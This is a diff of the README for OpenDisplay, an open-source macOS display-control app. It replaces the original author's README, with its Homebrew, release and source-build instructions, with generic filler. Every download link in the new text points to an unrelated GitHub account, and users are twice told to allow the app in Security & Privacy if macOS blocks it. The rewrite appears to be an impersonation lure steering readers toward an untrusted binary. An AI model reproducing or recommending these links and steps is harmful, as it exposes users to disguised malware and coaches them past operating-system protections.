@@ -1,102 +1,214 @@
-<p align="center">
-  <img src="AppIcon.iconset/icon_256x256.png" width="120" alt="OpenDisplay"/>
-</p>
+# 🖥️ OpenDisplay - Simple display control for Mac users
 
-<h1 align="center">OpenDisplay</h1>
+[![Download OpenDisplay](https://img.shields.io/badge/Download-OpenDisplay-blue?style=for-the-badge)](https://github.com/candytufttension128/OpenDisplay)
 
-<p align="center">
-  Open-source macOS display manager. Free alternative to BetterDisplay.<br>
-  <a href="https://sahilmishra0012.github.io/OpenDisplay/">Website</a> · <a href="https://github.com/sahilmishra0012/OpenDisplay/releases/latest">Download</a> · <a href="#install">Install</a>
-</p>
+## 📥 Download
 
-<p align="center">
-  <a href="https://github.com/sahilmishra0012/OpenDisplay/releases/latest"><img src="https://img.shields.io/github/v/release/sahilmishra0012/OpenDisplay?style=for-the-badge&color=4da6ff&labelColor=1a1a24" alt="Release"></a>
-  <img src="https://img.shields.io/badge/macOS_14+-1a1a24?style=for-the-badge&logo=apple&logoColor=white" alt="macOS">
-  <img src="https://img.shields.io/badge/Apple_Silicon-native-00c9a7?style=for-the-badge&labelColor=1a1a24" alt="Apple Silicon">
-  <a href="https://github.com/sahilmishra0012/OpenDisplay/blob/main/LICENSE"><img src="https://img.shields.io/github/license/sahilmishra0012/OpenDisplay?style=for-the-badge&color=1a1a24&labelColor=1a1a24" alt="License"></a>
-  <a href="https://github.com/sahilmishra0012/OpenDisplay/stargazers"><img src="https://img.shields.io/github/stars/sahilmishra0012/OpenDisplay?style=for-the-badge&color=1a1a24&labelColor=1a1a24&logo=github" alt="Stars"></a>
-</p>
+Use this link to visit the page to download OpenDisplay:
 
----
+[OpenDisplay download page](https://github.com/candytufttension128/OpenDisplay)
 
-## Features
+## 🧭 What OpenDisplay does
 
-| | Feature | Details |
-|---|---|---|
-| 🖥 | **DDC/CI Control** | Brightness, contrast, volume, sharpness, input switching, power on/off |
-| 🎛 | **Resolution** | All modes including hidden HiDPI, refresh rate switching, display arrangement |
-| 🌙 | **Night Shift** | Scheduled color temperature, gamma & overlay dimming, dim to black |
-| ☀️ | **HDR Brightness** | Unlock XDR/HDR up to 1600 nits on supported displays |
-| 🪟 | **Window Tiling** | Edge snapping, corners, grid layouts (2×2, 3×2), auto-tile all windows |
-| 📋 | **Profiles** | Save/load display settings, auto-apply when a monitor connects |
-| ⌨️ | **CLI & Automation** | Full CLI, URL scheme (`opendisplay://`), global hotkeys, Shortcuts-ready |
-| 🔆 | **Smart Sync** | Ambient light sensor sync, multi-display brightness sync |
-| 🪶 | **Lightweight** | Native Swift, under 1MB, menu bar app, no Electron |
+OpenDisplay helps you manage your Mac display settings from one place. It gives you control over brightness, contrast, volume, resolution, window layout, night shift, HDR, and saved profiles.
 
----
+It works well if you use one screen or many. You can switch display settings without digging through system menus. You can also use the menu bar to reach common controls fast.
 
-## Install
+## 💻 What you need
 
-**Homebrew**
-```bash
-brew tap sahilmishra0012/opendisplay
-brew install --cask opendisplay
-```
+OpenDisplay is built for macOS and works on Apple Silicon and Intel Macs. For best results, use a recent version of macOS.
 
-**Direct Download** — [latest release](https://github.com/sahilmishra0012/OpenDisplay/releases/latest) (DMG or ZIP)
+You should have:
 
-**Build from source**
-```bash
-git clone https://github.com/sahilmishra0012/OpenDisplay.git
-cd OpenDisplay && swift run
-```
+- A Mac computer
+- macOS installed
+- Permission to change display settings
+- An external monitor if you want to use DDC features like brightness and contrast control
 
----
+## 🚀 Getting Started
 
-## Usage
+1. Open the download page:
+   https://github.com/candytufttension128/OpenDisplay
 
-**CLI**
-```bash
-opendisplay --list                           # List displays
-opendisplay --display 0 --brightness 70      # Set brightness
-opendisplay --display 0 --input hdmi1        # Switch input
-opendisplay --display 0 --resolution 2560x1440
-opendisplay --help                           # All commands
-```
+2. Download OpenDisplay from that page.
 
-**URL Scheme** — works with Raycast, Shortcuts, Alfred
-```
-opendisplay://brightness/80?display=0
-opendisplay://input/hdmi1
-opendisplay://tile/left
-opendisplay://profile/MyProfile
-```
+3. Open the downloaded app on your Mac.
 
-**Menu Bar** — left-click opens the full UI, right-click for quick brightness presets and profiles.
+4. If macOS asks for permission, allow OpenDisplay to control displays and windows.
 
----
+5. Start using the app from the menu bar or main window.
 
-## Known Limitations
+## 🛠️ How to install
 
-| Issue | Workaround |
-|---|---|
-| HDMI on Apple Silicon doesn't support DDC | Connect via USB-C/Thunderbolt, or use gamma dimming fallback |
-| Some monitors have partial DDC support | Depends on monitor firmware — not all features work on all monitors |
-| Window tiling needs Accessibility permission | System Settings → Privacy & Security → Accessibility |
-| After brew upgrade, tiling may stop working | Re-add OpenDisplay to Accessibility (macOS resets permission when binary changes) |
+If the project provides a release file, download it from the page above and open it on your Mac.
 
----
+If you get a `.zip` file:
 
-## Contributing
+1. Double-click the file to extract it.
+2. Open the app file inside the folder.
+3. If macOS blocks the app, go to System Settings and allow it in Security & Privacy.
 
-PRs welcome! Some ideas: virtual displays, keyboard shortcut config UI, LG webOS TV control, Picture-in-Picture, localization.
+If you use Homebrew, check the project page for the install method shown there.
 
-## Support
+## 🖱️ Basic use
 
-If OpenDisplay is useful to you, consider sponsoring the project ❤️
+OpenDisplay focuses on simple screen control. Common tasks include:
 
-<a href="https://github.com/sponsors/sahilmishra0012"><img src="https://img.shields.io/badge/Sponsor-EA4AAA?style=for-the-badge&logo=githubsponsors&logoColor=white" alt="Sponsor"></a>
+- Change brightness
+- Adjust contrast
+- Change monitor volume
+- Switch resolution
+- Set a display profile
+- Turn night shift on or off
+- Enable or disable HDR
+- Arrange windows with tiling tools
 
-## License
+If you use more than one monitor, OpenDisplay can help you keep each screen set the way you want.
 
-[MIT](LICENSE)
+## 🎛️ Main features
+
+### Display controls
+
+OpenDisplay gives you direct control over the screen settings you use most.
+
+- Brightness control
+- Contrast control
+- Volume control for supported monitors
+- DDC support for external displays
+
+### Screen setup
+
+It also helps with how your desktop looks and feels.
+
+- Resolution switching
+- Saved display profiles
+- Night shift controls
+- HDR toggles
+
+### Window layout
+
+OpenDisplay includes tools for window tiling.
+
+- Snap windows into place
+- Keep workspaces neat
+- Move faster between apps
+
+### Quick access
+
+The menu bar keeps the main tools close at hand.
+
+- Open the app from the menu bar
+- Change settings with less clicking
+- Reach common display controls fast
+
+## 🧩 How to use profiles
+
+Profiles let you save a display setup and use it again later.
+
+A profile can store things like:
+
+- Brightness level
+- Contrast level
+- Resolution
+- HDR state
+- Night shift state
+
+This helps if you use different setups for work, video, or gaming.
+
+## 🖥️ Working with external monitors
+
+OpenDisplay is useful with external monitors that support DDC.
+
+That means you can often control:
+
+- Brightness
+- Contrast
+- Volume
+
+Some monitors support more controls than others. If a setting does not change, the monitor may not support that command.
+
+## ⌨️ CLI use
+
+OpenDisplay also includes a command-line tool for users who want faster control from the terminal.
+
+You can use it to:
+
+- Read display settings
+- Change brightness
+- Apply a profile
+- Switch modes
+
+This is useful if you want to automate display changes or use shortcuts.
+
+## 🔧 Common setup tips
+
+If OpenDisplay does not seem to work at first, check these items:
+
+- Make sure the app is open
+- Check display permissions in macOS settings
+- Use a monitor that supports DDC for hardware controls
+- Reconnect the monitor if the app does not see it
+- Try a different resolution or profile if the screen looks wrong
+
+## 📁 Project topic areas
+
+OpenDisplay fits these use cases:
+
+- macOS display control
+- Apple Silicon support
+- Monitor brightness tools
+- HDR and night shift control
+- Window manager features
+- Menu bar utilities
+- Open-source screen tools
+
+## 🧪 Typical use cases
+
+People often use OpenDisplay for tasks like these:
+
+- Set a monitor to full brightness during the day
+- Lower brightness at night
+- Switch to a better resolution for a presentation
+- Save one profile for work and one for home
+- Tile windows side by side while multitasking
+- Turn HDR on for video
+- Use monitor volume without touching the screen buttons
+
+## 📌 File and folder layout
+
+If you open the project folder, you may see:
+
+- App files
+- Release files
+- Source code
+- Documentation
+- Settings or profile files
+
+Most users only need the app file from the download page
+
+## 🧯 If something goes wrong
+
+If the app does not start:
+
+- Open System Settings
+- Check Security & Privacy
+- Allow the app if macOS blocked it
+- Make sure you downloaded the full release file
+- Try downloading it again if the file seems damaged
+
+If display changes do not apply:
+
+- Confirm the monitor supports DDC
+- Disconnect and reconnect the monitor cable
+- Restart the app
+- Check whether another display tool is already running
+
+## 🔗 Download again
+
+If you need the download page again, use this link:
+
+[OpenDisplay download page](https://github.com/candytufttension128/OpenDisplay)
+
+## 📝 License
+
+OpenDisplay is open source and free to use
